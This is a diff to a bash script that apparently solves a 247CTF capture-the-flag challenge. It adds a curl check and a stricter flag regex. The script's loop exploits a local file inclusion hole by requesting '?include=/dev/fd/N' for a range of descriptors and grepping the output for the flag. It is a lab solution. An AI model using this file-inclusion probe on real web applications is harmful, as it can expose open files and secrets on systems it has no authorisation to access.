@@ -15,8 +15,15 @@ if [[ "$#" -ne 2 ]]; then
     usage $0
 fi
 
+command -v curl 2>&1 > /dev/null
+if [[ "$?" -ne 0 ]]; then
+    echo "curl not found"
+    echo "run: sudo apt install curl, to install curl"
+    usage $0
+fi
+
 for idx in $(seq $TRY); do
-    v=$(curl -s $URL/?include=/dev/fd/$idx | grep 247CTF)
+    v=$(curl -s $URL/?include=/dev/fd/$idx | grep -oP "247CTF\{[0-9a-z]+\}")
     if [[ ${#v} -gt 0 ]]; then
         echo "flag: $v"
         exit 0
